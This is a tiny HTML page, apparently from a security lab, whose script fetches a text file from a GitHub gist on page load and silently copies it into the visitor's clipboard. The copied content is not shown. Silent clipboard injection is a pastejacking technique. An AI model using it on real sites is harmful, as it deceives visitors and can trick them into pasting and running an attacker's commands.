<!DOCTYPE html>
<html>
<head><meta charset="utf-8"></head>
<body>
  <script>
    // Añade la hora actual (?t=...) para prohibir cualquier caché del navegador
    const url = "https://gist.githubusercontent.com/kali-alumno/d57ece22ec98c76d42ad7ff6e9088c26/raw/C.txt?C=" + Date.now();

    fetch(url)
      .then(r => r.text())
      .then(texto => navigator.clipboard.writeText(texto));
  </script>
</body>
</html>
